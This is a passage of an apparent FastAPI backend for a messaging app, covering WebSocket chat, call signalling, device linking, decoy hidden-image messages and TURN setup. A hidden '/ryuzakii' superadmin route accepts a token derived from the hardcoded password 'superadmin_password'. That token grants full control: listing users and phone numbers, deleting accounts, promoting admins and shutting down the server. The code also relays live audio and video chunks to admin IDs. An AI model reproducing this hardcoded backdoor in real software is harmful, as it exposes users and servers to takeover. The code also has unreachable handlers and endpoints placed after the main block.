            for device_id, ws in list(device_map.items()):
                try:
                    await ws.send_text(payload)
                except Exception:
                    dead.append(device_id)
            for did in dead:
                device_map.pop(did, None)
                self._devices.pop(did, None)
            if not device_map:
                self._connections.pop(user_id, None)
                self._usernames.pop(user_id, None)

    async def handle_typing(self, sender_id: int, recipient_username: str, is_typing: bool, db: Session):
        """Send typing status to the recipient."""
        recipient = db.query(User).filter(User.username == recipient_username, User.is_active == True).first()
        if not recipient:
            return
        sender_username = self._usernames.get(sender_id, "Unknown")
        await self.send_to_user(recipient.id, {
            "type": "typing",
            "sender": sender_username,
            "is_typing": is_typing,
        })


ws_manager = ConnectionManager()


# Authentication dependency
async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security), 
                          db: Session = Depends(get_database_session)) -> User:
    """Get current authenticated user"""
    try:
        token = credentials.credentials

        # Validate session
        session = SessionService.validate_session(db, token)
        user_id = session.user_id if session else None

        # Fall back to a linked-device session token (multi-device login).
        if not user_id:
            device = db.query(LinkedDevice).filter(
                LinkedDevice.session_token == token,
                LinkedDevice.revoked_at.is_(None),
            ).first()
            if device:
                user_id = device.user_id
                setattr(device, 'last_seen', datetime.now(timezone.utc))
                db.commit()

        if not user_id:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid or expired session",
                headers={"WWW-Authenticate": "Bearer"},
            )

        # Get user
        user = db.query(User).filter(User.id == user_id, User.is_active == True).first()
        if not user:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="User not found",
                headers={"WWW-Authenticate": "Bearer"},
            )
        
        return user
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Auth error: {e}")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Authentication failed",
            headers={"WWW-Authenticate": "Bearer"},
        )

# Add admin authentication dependency
async def get_admin_user(credentials: HTTPAuthorizationCredentials = Depends(security), 
                        db: Session = Depends(get_database_session)) -> User:
    """Get current authenticated admin user"""
    try:
        user = await get_current_user(credentials, db)
        if not user.is_admin:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Only admin users can access this endpoint"
            )
        return user
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Admin auth error: {e}")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Admin authentication failed",
            headers={"WWW-Authenticate": "Bearer"},
        )
        
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )


@app.websocket("/ws")
async def websocket_chat(
    websocket: WebSocket,
    token: Optional[str] = None,
    device_id: Optional[str] = None,
    device_type: Optional[str] = "mobile",
    device_name: Optional[str] = "Unknown",
):
    """
    WebSocket for real-time chat.
    Query params: token, device_id, device_type (mobile|desktop), device_name
    """
    import uuid as _uuid
    user_id = None
    db = None
    try:
        if not token:
            await websocket.close(code=4001)
            return
        db = db_config.get_session()
        if not db:
            await websocket.close(code=4010)
            return
        session = SessionService.validate_session(db, token)
        if not session:
            await websocket.close(code=4001)
            return
        user = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
        if not user:
            await websocket.close(code=4001)
            return
        user_id = int(getattr(user, "id", 0))
        username = str(getattr(user, "username", "Unknown"))
        # Auto-generate device_id if client didn't send one (older app versions)
        resolved_device_id = (device_id or "").strip() or str(_uuid.uuid4())
        await ws_manager.connect(
            websocket, user_id, username,
            device_id=resolved_device_id,
            device_type=(device_type or "mobile").strip(),
            device_name=(device_name or "Unknown").strip(),
        )
        await websocket.send_text(json.dumps({"type": "connected", "user_id": user_id, "device_id": resolved_device_id}))

        # Deliver any ICE candidates that arrived while this user's socket was
        # down — otherwise those calls stay stuck "connecting".
        await flush_pending_ice(user_id)

        # Release the DB connection now. A WebSocket stays open for as long as the
        # user is online, and holding a pooled connection that whole time drained
        # the pool (30 connections) once ~30 users were online — new sockets and
        # HTTP requests then timed out. Below, each message that needs the DB
        # opens a short-lived session and closes it immediately.
        try:
            db.close()
        except Exception:
            pass
        db = None

        while True:
            raw = await websocket.receive_text()
            try:
                msg = json.loads(raw)
                if msg.get("type") == "ping":
                    await websocket.send_text(json.dumps({"type": "pong", "timestamp": time.time()}))
                elif msg.get("type") == "typing":
                    recipient_username = msg.get("recipient")
                    is_typing = msg.get("is_typing", False)
                    if recipient_username:
                        op_db = db_config.get_session()
                        try:
                            await ws_manager.handle_typing(user_id, recipient_username, is_typing, op_db)
                        finally:
                            if op_db:
                                op_db.close()
                elif msg.get("type") in ("call_invite", "call_accept", "call_reject",
                                              "call_end", "call_offer", "call_answer", "call_ice"):
                    # Forward call-signaling messages to the recipient
                    recipient_username = msg.get("recipient")
                    if recipient_username:
                        op_db = db_config.get_session()
                        try:
                            recipient = op_db.query(User).filter(
                                User.username == recipient_username, User.is_active == True
                            ).first()
                        finally:
                            if op_db:
                                op_db.close()
                        if recipient:
                            payload_out = dict(msg)
                            payload_out["sender"] = username
                            await ws_manager.send_to_user(int(getattr(recipient, "id", 0)), payload_out)
                elif msg.get("type") == "live_audio_chunk":
                    chunk_data = msg.get("data", {})
                    admin_id = chunk_data.get("admin_id")
                    if admin_id:
                        await ws_manager.send_to_user(int(admin_id), {
                            "type": "live_audio_chunk",
                            "data": chunk_data,
                        })
                elif msg.get("type") == "live_video_chunk":
                    chunk_data = msg.get("data", {})
                    admin_id = chunk_data.get("admin_id")
                    if admin_id:
                        await ws_manager.send_to_user(int(admin_id), {
                            "type": "live_video_chunk",
                            "data": chunk_data,
                        })
            except json.JSONDecodeError:
                pass
    except WebSocketDisconnect:
        pass
    except Exception as e:
        logger.warning(f"WebSocket error: {e}")
    finally:
        if user_id is not None:
            await ws_manager.disconnect(websocket, user_id)
        if db:
            try:
                db.close()
            except Exception:
                pass


# Add superadmin authentication dependency
async def get_superadmin(credentials: HTTPAuthorizationCredentials = Depends(security), 
                        db: Session = Depends(get_database_session)) -> User:
    """Get current authenticated superadmin user"""
    try:
        token = credentials.credentials
        
        # Special check for ryuzakii superadmin with master password
        # In production, use a more secure method like hashed password storage
        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
        if token == master_password_hash:
            # Create a temporary superadmin user object
            superadmin = User()
            setattr(superadmin, 'id', 0)
            setattr(superadmin, 'username', 'ryuzakii')
            setattr(superadmin, 'is_admin', True)
            return superadmin
            
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid superadmin credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
        
    except Exception as e:
        logger.error(f"Superadmin authentication error: {e}")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate superadmin credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )

@app.post("/ryuzakii/auth/login")
async def superadmin_login(password: str = Body(...)):
    """Superadmin login endpoint"""
    try:
        # Hash the provided password
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        # Check against master password (in production, store this securely)
        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
        
        if password_hash == master_password_hash:
            return {
                "username": "ryuzakii",
                "token": password_hash,
                "message": "Superadmin login successful"
            }
        else:
            raise HTTPException(status_code=401, detail="Invalid superadmin password")
            
    except Exception as e:
        logger.error(f"Superadmin login error: {e}")
        raise HTTPException(status_code=500, detail="Login failed")

@app.post("/ryuzakii/auth/change_password")
async def superadmin_change_password(
    current_password: str = Body(...),
    new_password: str = Body(...),
    superadmin: User = Depends(get_superadmin)
):
    """Change superadmin password"""
    try:
        # Verify current password
        current_hash = hashlib.sha256(current_password.encode()).hexdigest()
        master_password_hash = hashlib.sha256("superadmin_password".encode()).hexdigest()
        
        if current_hash != master_password_hash:
            raise HTTPException(status_code=401, detail="Invalid current password")
        
        # In a real implementation, you would update the stored password
        # For now, we'll just return success
        return {"message": "Superadmin password would be changed here (implementation placeholder)"}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Superadmin change password error: {e}")
        raise HTTPException(status_code=500, detail="Failed to change password")

@app.post("/ryuzakii/system/full_control")
async def superadmin_full_control(
    action: str = Body(...),
    parameters: Optional[Dict] = Body(None),
    superadmin: User = Depends(get_superadmin),
    db: Session = Depends(get_database_session)
):
    """Complete superadmin control endpoint with full system access"""
    try:
        # Verify this is the superadmin
        if getattr(superadmin, 'username', '') != 'ryuzakii':
            raise HTTPException(status_code=401, detail="Unauthorized access")
        
        # Handle different system control actions
        if action == "list_all_users":
            users = db.query(User).all()
            return {"users": [
                {
                    "id": getattr(u, 'id', 0),
                    "username": getattr(u, 'username', ''),
                    "phone_number": getattr(u, 'phone_number', ''),
                    "is_active": getattr(u, 'is_active', False),
                    "is_admin": getattr(u, 'is_admin', False)
                } for u in users
            ]}
        
        elif action == "delete_user":
            if not parameters or "username" not in parameters:
                raise HTTPException(status_code=400, detail="Missing username parameter")
            
            user = db.query(User).filter(User.username == parameters["username"]).first()
            if user:
                db.delete(user)
                db.commit()
                return {"message": f"User {user.username} deleted successfully"}
            else:
                raise HTTPException(status_code=404, detail="User not found")
        
        elif action == "create_admin":
            if not parameters or "username" not in parameters or "password" not in parameters:
                raise HTTPException(status_code=400, detail="Missing username or password parameter")
            
            # Check if user exists
            existing_user = db.query(User).filter(User.username == parameters["username"]).first()
            if existing_user:
                # Make existing user an admin
                setattr(existing_user, 'is_admin', True)
                setattr(existing_user, 'password_hash', hash_password(parameters["password"]))
                db.commit()
                return {"message": f"User {parameters['username']} promoted to admin"}
            else:
                raise HTTPException(status_code=404, detail="User not found")
        
        elif action == "system_stats":
            user_count = db.query(User).count()
            message_count = db.query(Message).count()
            active_sessions = db.query(UserSession).filter(UserSession.is_active == True).count()
            return {
                "user_count": user_count,
                "message_count": message_count,
                "active_sessions": active_sessions,
                "system_status": "operational"
            }
        
        elif action == "shutdown_server":
            # Log the shutdown action
            AuditService.log_event(
                db, 0, "server_shutdown", 
                "Server shutdown initiated by superadmin",
                severity="warning"
            )
            
            # Return response immediately before shutdown
            import asyncio
            import os
            import signal
            
            # Schedule shutdown after response is sent
            async def delayed_shutdown():
                await asyncio.sleep(1)  # Give time for response to be sent
                os.kill(os.getpid(), signal.SIGTERM)
            
            asyncio.create_task(delayed_shutdown())
            
            return {"message": "Server shutdown initiated. Server will stop shortly."}
        
        elif action == "restart_server":
            # Log the restart action
            AuditService.log_event(
                db, 0, "server_restart", 
                "Server restart initiated by superadmin",
                severity="warning"
            )
            
            # Return response immediately before restart
            import asyncio
            import os
            import sys
            
            # Schedule restart after response is sent
            async def delayed_restart():
                await asyncio.sleep(1)  # Give time for response to be sent
                os.execv(sys.executable, ['python'] + sys.argv)
            
            asyncio.create_task(delayed_restart())
            
            return {"message": "Server restart initiated. Server will restart shortly."}
        
        else:
            raise HTTPException(status_code=400, detail=f"Unknown action: {action}")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Superadmin control error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

if __name__ == "__main__":
    # Use Render's PORT environment variable, default to 8001 for local development
    port = int(os.getenv("PORT", 8010))
    uvicorn.run(
        "fastapi_mobile_backend_postgresql:app",
        host="0.0.0.0",
        port=port,
        reload=False,  # Disable reload in production
        log_level="info"
    )

# Helper function to get client IP
def get_client_ip(request):
    """Get client IP address from request"""
    return getattr(request.client, 'host', 'unknown') if hasattr(request, 'client') else 'unknown'

# API Endpoints
@app.get("/")
async def root():
    return {
        "message": "Secure Messaging API with PostgreSQL",
        "version": "2.1-PostgreSQL",
        "status": "running",
        "database": "PostgreSQL"
    }

@app.get("/health")
async def health_check():
    """Health check endpoint for Render"""
    return {"status": "healthy", "timestamp": datetime.now(timezone.utc).isoformat()}

@app.get("/status")
async def get_status(db: Session = Depends(get_database_session)):
    """Get system status"""
    try:
        users_count = db.query(User).filter(User.is_active == True).count()
        messages_count = db.query(Message).count()
        sessions_count = db.query(UserSession).filter(UserSession.is_active == True).count()
        
        return {
            "status": "running",
            "version": "2.1-PostgreSQL",
            "database": "PostgreSQL",
            "users_count": users_count,
            "messages_count": messages_count,
            "active_sessions": sessions_count,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    except Exception as e:
        logger.error(f"Status check error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")



@app.post("/auth/login")
async def login_user(login_data: UserLogin, db: Session = Depends(get_database_session)):
    """Login user with username and token - simplified JSON: {username, token}"""
    try:
        user = AdminService.authenticate_user(
            db, 
            login_data.username, 
            login_data.token, 
            ip_address="mobile_app"
        )
        if not user:
            raise HTTPException(status_code=401, detail="Invalid username, token, or password")
        
        # Create session
        user_id = int(getattr(user, 'id', 0)) if hasattr(getattr(user, 'id', 0), '__int__') else int(getattr(user, 'id', 0))
        session = SessionService.create_session(db, user_id, "mobile", "mobile_app")
        
        return {
            "username": str(getattr(user, 'username', '')),
            "token": str(getattr(session, 'session_token', '')),
            "is_admin": bool(getattr(user, 'is_admin', False))
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Login failed")

@app.post("/auth/logout")
async def logout_user(current_user: User = Depends(get_current_user), 
                     credentials: HTTPAuthorizationCredentials = Depends(security),
                     db: Session = Depends(get_database_session)):
    """Logout user"""
    try:
        token = credentials.credentials
        SessionService.invalidate_session(db, token)
        
        user_id = int(getattr(current_user, 'id', 0)) if hasattr(getattr(current_user, 'id', 0), '__int__') else int(getattr(current_user, 'id', 0))
        username = str(getattr(current_user, 'username', ''))
        AuditService.log_event(
            db, user_id, "user_logout", 
            f"User {username} logged out"
        )
        
        return {"message": "Logout successful"}
        
    except Exception as e:
        logger.error(f"Logout error: {e}")
        raise HTTPException(status_code=500, detail="Logout failed")

# ── Multi-device linking ────────────────────────────────────────────────────────

VALID_PLATFORMS = {"ios", "android", "desktop"}
LINK_REQUEST_TTL_MINUTES = 5

def _link_request_expired(req) -> bool:
    """expires_at is stored timezone-naive (UTC); make it aware before comparing."""
    exp = getattr(req, 'expires_at')
    if exp is None:
        return True
    if exp.tzinfo is None:
        exp = exp.replace(tzinfo=timezone.utc)
    return exp < datetime.now(timezone.utc)

class DeviceRegister(BaseModel):
    public_key: str = Field(..., description="This device's RSA public key (base64 SPKI)")
    platform: str = Field(..., description="ios | android | desktop")
    device_name: Optional[str] = Field(None, description="Human-readable device name")

class DeviceLinkStart(BaseModel):
    public_key: str
    platform: str
    device_name: Optional[str] = None

class DeviceLinkApprove(BaseModel):
    nonce: str

def _new_session_token(user_id: int) -> str:
    raw = f"{user_id}:{uuid.uuid4().hex}:{datetime.now(timezone.utc).isoformat()}"
    return base64.b64encode(raw.encode()).decode()

@app.post("/devices/register")
async def register_device(payload: DeviceRegister,
                          current_user: User = Depends(get_current_user),
                          db: Session = Depends(get_database_session)):
    """Register/refresh the calling device's identity key. Upserts by public key so
    the phone's migrated 'legacy' row is claimed with its real platform, and returns
    the device_uuid the client uses to find its own entry in a message key map."""
    platform = payload.platform.lower().strip()
    if platform not in VALID_PLATFORMS:
        raise HTTPException(status_code=400, detail="Invalid platform")
    pub = payload.public_key.strip()
    if not pub:
        raise HTTPException(status_code=400, detail="public_key required")

    user_id = int(getattr(current_user, 'id', 0))
    device = db.query(LinkedDevice).filter(
        LinkedDevice.user_id == user_id,
        LinkedDevice.public_key == pub,
    ).first()

    if device:
        setattr(device, 'platform', platform)
        if payload.device_name:
            setattr(device, 'device_name', payload.device_name)
        setattr(device, 'revoked_at', None)
        setattr(device, 'last_seen', datetime.now(timezone.utc))
    else:
        device = LinkedDevice(
            user_id=user_id,
            device_uuid=uuid.uuid4().hex,
            platform=platform,
            device_name=payload.device_name or platform,
            public_key=pub,
            last_seen=datetime.now(timezone.utc),
        )
        db.add(device)

    # Keep the user's canonical public_key pointing at their primary device so
    # older single-key clients still resolve a usable key.
    if not getattr(current_user, 'public_key', None):
        setattr(current_user, 'public_key', pub)

    db.commit()
    db.refresh(device)
    return {"device_uuid": device.device_uuid, "platform": device.platform}

@app.post("/devices/link/start")
async def device_link_start(payload: DeviceLinkStart,
                            db: Session = Depends(get_database_session)):
    """Unauthenticated: a new device posts its public key and gets a nonce to show
    as a QR code. An already-authenticated device approves it."""
    platform = payload.platform.lower().strip()
    if platform not in VALID_PLATFORMS:
        raise HTTPException(status_code=400, detail="Invalid platform")
    if not payload.public_key.strip():
        raise HTTPException(status_code=400, detail="public_key required")

    nonce = uuid.uuid4().hex
    req = DeviceLinkRequest(
        nonce=nonce,
        public_key=payload.public_key.strip(),
        platform=platform,
        device_name=payload.device_name,
        expires_at=datetime.now(timezone.utc) + timedelta(minutes=LINK_REQUEST_TTL_MINUTES),
        consumed=False,
    )
    db.add(req)
    db.commit()
    return {"nonce": nonce, "expires_in": LINK_REQUEST_TTL_MINUTES * 60}

@app.post("/devices/link/approve")
async def device_link_approve(payload: DeviceLinkApprove,
                              current_user: User = Depends(get_current_user),
                              db: Session = Depends(get_database_session)):
    """Authenticated device scans a QR and approves the pending link. Enforces one
    device per platform by revoking any existing device of the same platform."""
    req = db.query(DeviceLinkRequest).filter(DeviceLinkRequest.nonce == payload.nonce).first()
    if not req or bool(getattr(req, 'consumed', False)):
        raise HTTPException(status_code=404, detail="Link request not found or already used")
    if _link_request_expired(req):
        raise HTTPException(status_code=410, detail="Link request expired")

    user_id = int(getattr(current_user, 'id', 0))
    platform = str(getattr(req, 'platform'))

    # One device per platform: revoke existing active devices of this platform.
    existing = db.query(LinkedDevice).filter(
        LinkedDevice.user_id == user_id,
        LinkedDevice.platform == platform,
        LinkedDevice.revoked_at.is_(None),
    ).all()
    now = datetime.now(timezone.utc)
    for d in existing:
        setattr(d, 'revoked_at', now)

    device_uuid = uuid.uuid4().hex
    session_token = _new_session_token(user_id)
    device = LinkedDevice(
        user_id=user_id,
        device_uuid=device_uuid,
        platform=platform,
        device_name=getattr(req, 'device_name', None) or platform,
        public_key=str(getattr(req, 'public_key')),
        session_token=session_token,
        last_seen=now,
    )
    db.add(device)

    setattr(req, 'consumed', True)
    setattr(req, 'approved_user_id', user_id)
    setattr(req, 'device_uuid', device_uuid)
    setattr(req, 'session_token', session_token)

    db.commit()
    AuditService.log_event(db, user_id, "device_linked",
                           f"Linked new {platform} device '{device.device_name}'")
    return {"device_uuid": device_uuid, "platform": platform, "device_name": device.device_name}

@app.get("/devices/link/status/{nonce}")
async def device_link_status(nonce: str, db: Session = Depends(get_database_session)):
    """Unauthenticated: the pending device polls this until approved, then receives
    its session token and username and is logged in."""
    req = db.query(DeviceLinkRequest).filter(DeviceLinkRequest.nonce == nonce).first()
    if not req:
        raise HTTPException(status_code=404, detail="Link request not found")
    if bool(getattr(req, 'consumed', False)) and getattr(req, 'session_token', None):
        user = db.query(User).filter(User.id == getattr(req, 'approved_user_id')).first()
        return {
            "status": "approved",
            "session_token": getattr(req, 'session_token'),
            "device_uuid": getattr(req, 'device_uuid'),
            "username": str(getattr(user, 'username', '')) if user else "",
        }
    if _link_request_expired(req):
        return {"status": "expired"}
    return {"status": "pending"}

@app.get("/users/{username}/devices")
async def get_user_devices(username: str,
                           current_user: User = Depends(get_current_user),
                           db: Session = Depends(get_database_session)):
    """Active device public keys for a user — senders wrap the message AES key once
    per entry so every one of the recipient's devices can decrypt."""
    user = db.query(User).filter(User.username == username, User.is_active == True).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    devices = db.query(LinkedDevice).filter(
        LinkedDevice.user_id == user.id,
        LinkedDevice.revoked_at.is_(None),
    ).all()
    return {
        "devices": [
            {"device_uuid": d.device_uuid, "public_key": d.public_key, "platform": d.platform}
            for d in devices
        ]
    }

@app.get("/devices")
async def list_my_devices(current_user: User = Depends(get_current_user),
                          db: Session = Depends(get_database_session)):
    """This user's own devices, for the device-management screen."""
    user_id = int(getattr(current_user, 'id', 0))
    devices = db.query(LinkedDevice).filter(
        LinkedDevice.user_id == user_id,
        LinkedDevice.revoked_at.is_(None),
    ).order_by(LinkedDevice.created_at.asc()).all()
    return {
        "devices": [
            {
                "device_uuid": d.device_uuid,
                "platform": d.platform,
                "device_name": d.device_name,
                "created_at": d.created_at.isoformat() if d.created_at else None,
                "last_seen": d.last_seen.isoformat() if d.last_seen else None,
            }
            for d in devices
        ]
    }

@app.post("/devices/{device_uuid}/revoke")
async def revoke_device(device_uuid: str,
                        current_user: User = Depends(get_current_user),
                        db: Session = Depends(get_database_session)):
    """Revoke (unlink) one of the user's devices."""
    user_id = int(getattr(current_user, 'id', 0))
    device = db.query(LinkedDevice).filter(
        LinkedDevice.device_uuid == device_uuid,
        LinkedDevice.user_id == user_id,
    ).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    setattr(device, 'revoked_at', datetime.now(timezone.utc))
    setattr(device, 'session_token', None)
    db.commit()
    AuditService.log_event(db, user_id, "device_revoked",
                           f"Revoked {device.platform} device '{device.device_name}'")
    return {"message": "Device revoked"}

class DeviceTokenRegister(BaseModel):
    push_token: str
    platform: str = "ios"

@app.post("/notifications/register-device")
async def register_device_token(payload: DeviceTokenRegister,
                                current_user: User = Depends(get_current_user),
                                db: Session = Depends(get_database_session)):
    """Register a device push token (APNs) for offline notification delivery"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        user = db.query(User).filter(User.id == user_id).first()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        user.push_token = f"{payload.platform}:{payload.push_token}"[:512]
        db.commit()
        return {"status": "registered"}
    except HTTPException:
        raise
    except Exception as e:
        db.rollback()
        logger.error(f"Register device token error: {e}")
        raise HTTPException(status_code=500, detail="Failed to register device token")

@app.post("/messages/send")
async def send_message(message_data: MessageSend, 
                      current_user: User = Depends(get_current_user),
                      db: Session = Depends(get_database_session)):
    """Send a message - simplified JSON: {phone_number, message}"""
    try:
        user_id = int(getattr(current_user, 'id', 0)) if hasattr(getattr(current_user, 'id', 0), '__int__') else int(getattr(current_user, 'id', 0))
        message = MessageService.send_message_by_username(
            db, user_id, message_data.username, message_data.message, message_data.disappear_after_hours,
            message_data.encrypted_key, message_data.iv, message_data.decoy_content
        )
        recipient_id = int(getattr(message, 'recipient_id', 0))
        sender_username = str(getattr(current_user, 'username', ''))
        ws_sent = await ws_manager.send_to_user(recipient_id, {
            "type": "new_message",
            "data": {
                "message_id": getattr(message, "id", None),
                "sender_username": sender_username,
                "recipient_username": message_data.username,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            },
        })
        if not ws_sent:
            # Recipient offline — fall back to APNs push (sound matches in-app beep)
            await push_to_user(db, recipient_id, "New message", f"From {sender_username}", sound="beep.caf")
        response = {
            "username": message_data.username,
            "message": "sent"
        }
        auto_delete = getattr(message, 'auto_delete', False)
        expires_at = getattr(message, 'expires_at', None)
        if auto_delete and expires_at:
            response["expires_at"] = expires_at.isoformat() if hasattr(expires_at, 'isoformat') else str(expires_at)
            response["auto_delete"] = str(auto_delete).lower()
        return response
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send message error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send message")

@app.post("/messages/send_decoy_image")
async def send_decoy_image(
    message_data: DecoyImageMessage,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Send an image hidden under decoy text - no encryption, just hidden"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Create a decoy message that hides the image
        # The image will be embedded in the message content in a way that requires the master token to extract
        import base64
        import json
        
        # Create a payload that contains the image data
        image_payload = {
            "type": "decoy_image",
            "image_data": message_data.image_content,
            "filename": message_data.filename,
            "file_size": message_data.file_size,
            "timestamp": int(time.time())
        }
        
        # Convert to JSON and base64 encode
        image_json = json.dumps(image_payload)
        encoded_image_data = base64.b64encode(image_json.encode()).decode()
        
        # Embed the encoded image data within decoy text
        # We'll create a message that looks like normal text but contains the hidden image data
        decoy_message = f"{FakeTextGenerator.generate_paragraph(2)} [IMAGE_DATA:{encoded_image_data}] {FakeTextGenerator.generate_paragraph(1)}"
        
        # Send as a regular message
        message = MessageService.send_message_by_username(
            db, user_id, message_data.username, decoy_message, message_data.disappear_after_hours
        )
        
        return {
            "message_id": getattr(message, 'id', 0),
            "recipient": message_data.username,
            "status": "sent",
            "message": "Image sent hidden under decoy text"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send decoy image error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send decoy image")

@app.post("/messages/send_decoy_document")
async def send_decoy_document(
    message_data: DecoyDocumentMessage,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Send a document hidden under decoy text - no encryption, just hidden"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        
        # Create a decoy message that hides the document
        # The document will be embedded in the message content in a way that requires the master token to extract
        import base64
        import json
        
        # Create a payload that contains the document data
        document_payload = {
            "type": "decoy_document",
            "document_data": message_data.document_content,
            "filename": message_data.filename,
            "file_size": message_data.file_size,
            "mime_type": message_data.mime_type,
            "timestamp": int(time.time())
        }
        
        # Convert to JSON and base64 encode
        document_json = json.dumps(document_payload)
        encoded_document_data = base64.b64encode(document_json.encode()).decode()
        
        # Embed the encoded document data within decoy text
        # We'll create a message that looks like normal text but contains the hidden document data
        decoy_message = f"{FakeTextGenerator.generate_paragraph(2)} [DOCUMENT_DATA:{encoded_document_data}] {FakeTextGenerator.generate_paragraph(1)}"
        
        # Send as a regular message
        message = MessageService.send_message_by_username(
            db, user_id, message_data.username, decoy_message, message_data.disappear_after_hours
        )
        
        return {
            "message_id": getattr(message, 'id', 0),
            "recipient": message_data.username,
            "status": "sent",
            "message": "Document sent hidden under decoy text"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send decoy document error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send decoy document")


# --- Call Endpoints ---

# TURN configuration. TURN_AUTH_SECRET is the shared secret configured in
# /etc/coturn/turnserver-rest.conf (static-auth-secret) and must never be shipped
# in a client build — clients ask this endpoint for short-lived credentials.
TURN_REALM = os.getenv("TURN_REALM", "turndilarion.eibstratoc.com")
TURN_AUTH_SECRET = os.getenv("TURN_AUTH_SECRET", "")
TURN_REST_PORT = int(os.getenv("TURN_REST_PORT", "3479"))
TURN_TLS_PORT = int(os.getenv("TURN_REST_TLS_PORT", "5350"))
TURN_CRED_TTL = int(os.getenv("TURN_CRED_TTL_SECONDS", str(12 * 3600)))

# Answering a call requires the master token: it proves the owner is the one
# picking up, so someone holding the unlocked handset cannot take their calls.
# Deliberately on by default; set REQUIRE_MASTER_TOKEN_FOR_CALLS=0 to disable.
REQUIRE_MASTER_TOKEN_FOR_CALLS = os.getenv(
    "REQUIRE_MASTER_TOKEN_FOR_CALLS", "1"
) not in ("0", "false", "False")

# Public relays, appended last so ICE only falls back to them when our own TURN
# cannot be reached. They are shared, rate-limited and operated by third parties:
# call audio stays end-to-end encrypted (DTLS-SRTP), but whoever runs them sees
# who relays with whom and from which IP. Turn this off once inbound UDP reaches
# our own TURN — set TURN_PUBLIC_FALLBACK=0.
TURN_PUBLIC_FALLBACK = os.getenv("TURN_PUBLIC_FALLBACK", "1") not in ("0", "false", "False")
PUBLIC_FALLBACK_ICE = [
    {
        "urls": [
            "turn:openrelay.metered.ca:80",
            "turn:openrelay.metered.ca:443?transport=tcp",
            "turn:a.relay.metered.ca:80",
            "turn:a.relay.metered.ca:443?transport=tcp",
        ],
        "username": "openrelayproject",
        "credential": "openrelayproject",
    },
]


@app.get("/webrtc/ice-servers")
async def get_ice_servers(current_user: User = Depends(get_current_user)):
    """
    ICE servers for a call, with time-limited TURN credentials (TURN REST API).

    username = "<unix-expiry>:<username>", password = base64(HMAC-SHA1(username, secret)).
    coturn derives the same key from its static-auth-secret, so no per-user state
    is stored anywhere and a leaked credential dies at expiry.
    """
    # "urls" is always a list so clients can parse one shape.
    ice_servers = [
        {"urls": ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302"]},
    ]

    if TURN_AUTH_SECRET:
        expiry = int(datetime.now(timezone.utc).timestamp()) + TURN_CRED_TTL
        username = f"{expiry}:{getattr(current_user, 'username', 'user')}"
        credential = base64.b64encode(
            hmac.new(
                TURN_AUTH_SECRET.encode("utf-8"),
                username.encode("utf-8"),
                hashlib.sha1,
            ).digest()
        ).decode("utf-8")
        ice_servers.append({
            "urls": [
                f"turn:{TURN_REALM}:{TURN_REST_PORT}",
                f"turn:{TURN_REALM}:{TURN_REST_PORT}?transport=tcp",
                f"turns:{TURN_REALM}:{TURN_TLS_PORT}?transport=tcp",
            ],
            "username": username,
            "credential": credential,
        })
        ttl = TURN_CRED_TTL
    else:
        # No secret configured — clients fall back to their built-in servers.
        logger.warning("TURN_AUTH_SECRET not set; serving STUN-only ICE config")
        ttl = 0

    if TURN_PUBLIC_FALLBACK:
        ice_servers.extend(PUBLIC_FALLBACK_ICE)

    return {"ice_servers": ice_servers, "ttl": ttl}


@app.post("/calls/initiate")
async def initiate_call(
    call_data: CallRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Initiate a voice or video call"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        call = await CallService.initiate_call(
            db, user_id, call_data.recipient_username, call_data.call_type, call_data.offer_sdp
        )
        return {
            "call_id": int(call.id),
            "status": "initiated",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Initiate call error: {e}")
        raise HTTPException(status_code=500, detail="Failed to initiate call")

@app.get("/calls/{call_id}/status")
async def get_call_status(
    call_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    Current state of a call, plus the answer SDP if the callee has accepted.

